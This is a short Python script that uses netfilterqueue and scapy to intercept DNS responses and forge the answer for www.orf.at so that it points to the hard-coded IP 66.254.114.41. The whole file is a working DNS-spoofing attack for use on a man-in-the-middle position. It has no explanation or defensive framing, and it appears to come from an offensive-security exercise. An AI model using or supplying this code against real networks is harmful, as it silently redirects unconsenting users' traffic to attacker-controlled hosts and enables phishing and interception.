#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.DNSRR):
		q_name = scapy_packet[scapy.DNSQR].qname

		if "www.orf.at." in q_name:
			print("[+] Spoofing target: " + q_name)

			answer = scapy.DNSRR(rrname=q_name, rdata="66.254.114.41")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(str(scapy_packet))
	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # Callback-Function
queue.run()
